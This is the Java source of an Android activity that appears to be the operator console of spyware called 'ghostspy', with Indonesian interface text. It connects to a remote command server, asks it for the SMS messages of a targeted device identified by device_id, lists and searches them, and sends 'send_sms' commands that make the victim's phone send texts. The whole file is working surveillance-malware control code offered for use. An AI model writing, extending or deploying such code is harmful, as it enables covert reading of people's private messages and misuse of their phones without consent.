package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

public class SmsActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private LinearLayout smsContainer;
    private TextView statsText;
    private EditText searchInput;
    private List<JSONObject> allSms = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");

        // Root layout
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF0B0B0B);
        setContentView(root);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF181818);
        header.setPadding(16, 12, 16, 12);
        root.addView(header);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        header.addView(backBtn);

        TextView title = new TextView(this);
        title.setText("💬 SMS Manager");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(18);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        title.setLayoutParams(titleParams);
        header.addView(title);

        Button refreshBtn = new Button(this);
        refreshBtn.setText("🔄");
        refreshBtn.setTextColor(0xFFFFFFFF);
        refreshBtn.setBackgroundColor(0x00000000);
        refreshBtn.setOnClickListener(v -> sendCmd("get_sms"));
        header.addView(refreshBtn);

        // Statistik
        statsText = new TextView(this);
        statsText.setText("Total: 0 | Belum Dibaca: 0");
        statsText.setTextColor(0xFF9AA3B2);
        statsText.setPadding(16, 8, 16, 8);
        root.addView(statsText);

        // Search & Filter
        LinearLayout toolbar = new LinearLayout(this);
        toolbar.setOrientation(LinearLayout.HORIZONTAL);
        toolbar.setPadding(16, 4, 16, 8);

        searchInput = new EditText(this);
        searchInput.setHint("Cari nomor atau teks...");
        searchInput.setTextColor(0xFFFFFFFF);
        searchInput.setBackgroundColor(0xFF151515);
        searchInput.setPadding(12, 8, 12, 8);
        LinearLayout.LayoutParams searchParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        searchInput.setLayoutParams(searchParams);
        searchInput.addTextChangedListener(new android.text.TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override public void afterTextChanged(android.text.Editable s) {
                filterSms(s.toString());
            }
        });
        toolbar.addView(searchInput);

        Button sendBtn = new Button(this);
        sendBtn.setText("✉️");
        sendBtn.setTextColor(0xFFFFFFFF);
        sendBtn.setBackgroundColor(0xFF151515);
        sendBtn.setOnClickListener(v -> showSendDialog());
        toolbar.addView(sendBtn);

        root.addView(toolbar);

        // Daftar SMS
        ScrollView scroll = new ScrollView(this);
        smsContainer = new LinearLayout(this);
        smsContainer.setOrientation(LinearLayout.VERTICAL);
        smsContainer.setPadding(16, 0, 16, 16);
        scroll.addView(smsContainer);
        root.addView(scroll);

        // Socket
        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}

        socket.on("sms_data", args -> {
            try {
                JSONArray sms = (JSONArray) args[0];
                allSms.clear();
                for (int i = 0; i < sms.length(); i++) {
                    try {
                        allSms.add(sms.getJSONObject(i));
                    } catch (Exception e) {}
                }
                runOnUiThread(() -> {
                    statsText.setText("Total: " + allSms.size() + " | Belum Dibaca: 0");
                    filterSms(searchInput.getText().toString());
                });
            } catch (Exception e) {}
        });

        sendCmd("get_sms");
    }

    private void filterSms(String query) {
        smsContainer.removeAllViews();
        for (JSONObject sms : allSms) {
            String address = sms.optString("address", "");
            String body = sms.optString("body", "");
            if (!query.isEmpty() && !address.contains(query) && !body.contains(query)) continue;
            addSmsCard(sms);
        }
    }

    private void addSmsCard(JSONObject sms) {
        String address = sms.optString("address", "Unknown");
        String body = sms.optString("body", "");
        String date = sms.optString("date", "");
        String type = sms.optString("type", "inbox");

        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.HORIZONTAL);
        card.setBackground(getDrawable(R.drawable.card_admin));
        card.setPadding(16, 12, 16, 12);
        card.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 0, 0, 8);
        card.setLayoutParams(lp);

        // Ikon kontak
        TextView iconView = new TextView(this);
        iconView.setText("👤");
        iconView.setTextSize(24);
        iconView.setPadding(0, 0, 12, 0);
        card.addView(iconView);

        // Info
        LinearLayout infoCol = new LinearLayout(this);
        infoCol.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        infoCol.setLayoutParams(infoParams);

        TextView addrView = new TextView(this);
        addrView.setText(address);
        addrView.setTextColor(0xFFFFFFFF);
        addrView.setTextSize(14);
        addrView.setTypeface(null, android.graphics.Typeface.BOLD);

        TextView bodyView = new TextView(this);
        bodyView.setText(body.length() > 40 ? body.substring(0, 40) + "..." : body);
        bodyView.setTextColor(0xFF9AA3B2);
        bodyView.setTextSize(12);

        infoCol.addView(addrView);
        infoCol.addView(bodyView);
        card.addView(infoCol);

        // Waktu
        TextView timeView = new TextView(this);
        timeView.setText(date);
        timeView.setTextColor(0xFF9AA3B2);
        timeView.setTextSize(10);
        card.addView(timeView);

        // Klik -> detail
        card.setOnClickListener(v -> {
            Intent i = new Intent(SmsActivity.this, ConversationActivity.class);
            i.putExtra("address", address);
            i.putExtra("body", body);
            i.putExtra("date", date);
            startActivity(i);
        });

        smsContainer.addView(card);
    }

    private void showSendDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Kirim SMS");
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(16, 8, 16, 8);

        EditText numberInput = new EditText(this);
        numberInput.setHint("Nomor tujuan");
        numberInput.setTextColor(0xFFFFFFFF);
        numberInput.setBackgroundColor(0xFF151515);

        EditText textInput = new EditText(this);
        textInput.setHint("Isi pesan");
        textInput.setTextColor(0xFFFFFFFF);
        textInput.setBackgroundColor(0xFF151515);

        layout.addView(numberInput);
        layout.addView(textInput);
        builder.setView(layout);
        builder.setPositiveButton("Kirim", (d, w) -> {
            String num = numberInput.getText().toString().trim();
            String txt = textInput.getText().toString().trim();
            if (!num.isEmpty() && !txt.isEmpty()) {
                sendCmd("send_sms", new JSONObject() {{
                    try { put("number", num); put("text", txt); } catch (Exception e) {}
                }});
            }
        });
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    private void sendCmd(String cmd) {
        sendCmd(cmd, new JSONObject());
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
            } catch (Exception e) {}
        }
    }

    @Override
    protected void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
